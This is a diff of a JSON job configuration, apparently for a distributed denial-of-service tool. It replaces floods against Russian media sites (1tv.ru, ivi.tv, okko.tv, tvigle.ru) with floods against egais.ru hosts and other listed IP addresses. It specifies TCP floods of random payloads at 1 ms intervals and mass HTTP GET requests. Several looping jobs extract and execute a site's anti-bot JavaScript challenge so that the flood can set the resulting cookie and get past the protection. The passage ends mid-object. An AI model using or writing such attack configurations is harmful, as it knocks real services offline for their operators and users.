@@ -1,2011 +1,246 @@
 {
   "jobs": [{
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "81.211.33.101:21",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
       "type": "http",
-      "count": 7,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://subscr.1tv.ru/"
+          "path": "http://egais.ru"
         },
         "client": {
           "static_host": {
-            "addr": "81.211.33.101:80",
+            "addr": "146.120.90.19:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 7,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.ivi.tv/"
+          "path": "https://egais.ru"
         },
         "client": {
           "static_host": {
-            "addr": "80.67.43.65:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.ivi.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "80.67.43.65:443",
+            "addr": "146.120.90.19:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 7,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.ivi.tv/"
+          "path": "http://service.egais.ru"
         },
         "client": {
           "static_host": {
-            "addr": "80.67.43.33:80",
+            "addr": "146.120.90.19:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 7,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.ivi.tv/"
+          "path": "https://service.egais.ru"
         },
         "client": {
           "static_host": {
-            "addr": "80.67.43.33:443",
+            "addr": "146.120.90.19:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 7,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "http://www.ivi.tv/"
+          "path": "http://check.egais.ru"
         },
         "client": {
           "static_host": {
-            "addr": "80.67.43.1:80",
+            "addr": "146.120.90.19:80",
             "is_tls": "false"
           }
         }
       }
     }, {
       "type": "http",
-      "count": 7,
+      "count": 32,
       "args": {
         "request": {
           "method": "GET",
-          "path": "https://www.ivi.tv/"
+          "path": "https://check.egais.ru"
         },
         "client": {
           "static_host": {
-            "addr": "80.67.43.1:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://okko.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.169.155.118:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://okko.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.169.155.118:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://cabinet.okko.tv/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "151.236.80.51:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://cabinet.okko.tv/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "151.236.80.51:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://agents.okko.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.170.242.84:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://agents.okko.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.170.242.84:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://premiere.okko.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.170.242.84:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://premiere.okko.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "178.170.242.84:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://show.okko.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.169.155.116:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://show.okko.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.169.155.116:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://mimimi.okko.team/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "151.236.80.50:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://mimimi.okko.team/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "151.236.80.50:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://pobeda.okko.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.169.155.116:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://pobeda.okko.tv/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "185.169.155.116:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.81:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.81:443",
+            "addr": "146.120.90.19:443",
             "is_tls": "true"
           }
         }
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.81:8088",
+        "address": "146.120.90.38:80",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.81:8099",
+        "address": "146.120.90.38:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.81:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.86:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.86:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.86:8088",
+        "address": "146.120.90.62:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.86:8099",
+        "address": "146.120.90.74:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.86:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.82:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.82:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.82:8088",
+        "address": "146.120.90.73:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.82:8099",
+        "address": "146.120.90.246:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.82:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.87:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.87:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.87:8088",
+        "address": "146.120.90.28:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.87:8099",
+        "address": "146.120.90.247:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.87:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.84:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.84:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.84:8088",
+        "address": "146.120.90.29:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.84:8099",
+        "address": "146.120.90.30:443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.84:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.85:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.85:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.85:8088",
+        "address": "146.120.90.34:8443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.85:8099",
+        "address": "146.120.90.41:8080",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.85:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.83:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.83:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.83:8088",
+        "address": "146.120.90.41:8443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.83:8099",
+        "address": "146.120.90.42:8080",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.83:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.80:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://www.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.80:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.80:8088",
+        "address": "146.120.90.42:8443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.80:8099",
+        "address": "146.120.90.169:8443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.80:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.81:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.81:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.81:8088",
+        "address": "146.120.90.52:4443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.81:8099",
+        "address": "146.120.90.52:8080",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
     }, {
       "type": "tcp",
-      "count": 7,
+      "count": 32,
       "args": {
-        "address": "79.142.100.81:8123",
+        "address": "146.120.90.52:8443",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1
       }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.86:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.86:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.86:8088",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.86:8099",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.86:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.82:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.82:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.82:8088",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.82:8099",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.82:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.87:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.87:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.87:8088",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.87:8099",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.87:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.84:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.84:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.84:8088",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.84:8099",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.84:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.85:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.85:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.85:8088",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.85:8099",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.85:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.83:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.83:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.83:8088",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.83:8099",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.83:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.80:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://cloud.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.80:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.80:8088",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.80:8099",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.80:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://vendor.tvigle.ru/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.44:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://vendor.tvigle.ru/login"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.44:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.44:8088",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.44:8099",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.44:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "http://downloader.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.44:80",
-            "is_tls": "false"
-          }
-        }
-      }
-    }, {
-      "type": "http",
-      "count": 7,
-      "args": {
-        "request": {
-          "method": "GET",
-          "path": "https://downloader.tvigle.ru/"
-        },
-        "client": {
-          "static_host": {
-            "addr": "79.142.100.44:443",
-            "is_tls": "true"
-          }
-        }
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.44:8088",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.44:8099",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "tcp",
-      "count": 7,
-      "args": {
-        "address": "79.142.100.44:8123",
-        "body": "{{ random_payload 10 }}",
-        "interval_ms": 1
-      }
-    }, {
-      "type": "loop",
-      "args": {
-        "job": {
-          "type": "discard-error",
-          "args": {
-            "job": {
-              "type": "timeout",
-              "args": {
-                "timeout": "1h",
-                "job": {
-                  "type": "sequence",
-                  "args": {
-                    "jobs": [
-                      {
-                        "type": "set-value",
-                        "name": "useragent",
-                        "args": {
-                          "value": "{{ random_user_agent }}"
-                        }
-                      },
-                      {
-                        "type": "http-request",
-                        "name": "initial",
-                        "args": {
-                          "request": {
-                            "method": "GET",
-                            "path": "https://www.1tv.ru/live",
-                            "headers": {
-                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                              "Accept": "text/html",
-                              "Accept-Language": "en-US",
-                              "Connection": "keep-alive"
-                            }
-                          }
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "source",
-                        "args": {
-                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "extract-script",
-                        "args": {
-                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                        }
-                      },
-                      {
-                        "type": "js",
-                        "name": "exec-script",
-                        "args": {
-                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                        }
-                      },
-                      {
-                        "type": "parallel",
-                        "args": {
-                          "jobs": [
-                            {
-                              "type": "http",
-                              "count": 7,
-                              "args": {
-                                "request": {
-                                  "method": "GET",
-                                  "path": "https://www.1tv.ru/live",
-                                  "headers": {
-                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                  },
-                                  "cookies": {
-                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                  }
-                                }
-                              }
-                            }
-                          ]
-                        }
-                      }
-                    ]
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }, {
-      "type": "loop",
-      "args": {
-        "job": {
-          "type": "discard-error",
-          "args": {
-            "job": {
-              "type": "timeout",
-              "args": {
-                "timeout": "1h",
-                "job": {
-                  "type": "sequence",
-                  "args": {
-                    "jobs": [
-                      {
-                        "type": "set-value",
-                        "name": "useragent",
-                        "args": {
-                          "value": "{{ random_user_agent }}"
-                        }
-                      },
-                      {
-                        "type": "http-request",
-                        "name": "initial",
-                        "args": {
-                          "request": {
-                            "method": "GET",
-                            "path": "https://tlxmob.1tv.ru/",
-                            "headers": {
-                              "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                              "Accept": "text/html",
-                              "Accept-Language": "en-US",
-                              "Connection": "keep-alive"
-                            }
-                          }
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "source",
-                        "args": {
-                          "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                        }
-                      },
-                      {
-                        "type": "set-value",
-                        "name": "extract-script",
-                        "args": {
-                          "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                        }
-                      },
-                      {
-                        "type": "js",
-                        "name": "exec-script",
-                        "args": {
-                          "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                        }
-                      },
-                      {
-                        "type": "parallel",
-                        "args": {
-                          "jobs": [
-                            {
-                              "type": "http",
-                              "count": 7,
-                              "args": {
-                                "request": {
-                                  "method": "GET",
-                                  "path": "https://tlxmob.1tv.ru/",
-                                  "headers": {
-                                    "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                  },
-                                  "cookies": {
-                                    "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                  }
-                                }
-                              }
-                            }
-                          ]
-                        }
-                      }
-                    ]
-                  }
-                }
-              }
-            }
-          }
-        }
-      }
-    }, {
-      "type": "loop",
-      "args": {
-        "job": {
-          "type": "discard-error",
-          "args": {
-            "job": {
-              "type": "timeout",
-              "args": {
-                "timeout": "1h",
-                "job": {
-                  "type": "sequence",
-                  "args": {
-                    "jobs": [
-                      {
-                        "type": "set-value",
-                        "name": "useragent",
-                        "args": {
-                          "value": "{{ random_user_agent }}"
-                        }
-                      },
-                      {
-                        "type": "http-request",
-                        "name": "initial",
-                        "args": {
-                          "request": {
-                            "method": "GET",
-                            "path": "https://25.1tv.ru/",
-                            "headers": {
